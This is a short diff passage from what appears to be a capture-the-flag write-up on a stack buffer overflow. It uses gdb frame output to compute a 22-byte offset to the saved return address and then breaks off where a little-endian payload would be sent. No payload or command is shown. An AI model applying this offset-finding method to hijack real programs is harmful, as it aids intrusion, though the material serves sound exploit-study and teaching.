@@ -41,6 +41,7 @@ Inspect the current stack frame:
 info frame
 ```
 Relevant output: `Saved registers: eip at 0xffffc85c`
+
 3. Calculating the offset the distance from buffer to saved return address: `0xffffc85c - 0xffffc846 = 0x16 = 22 bytes`
 4. Send the payload to the challenge server having the little-endian system in consideration:
 ```bash
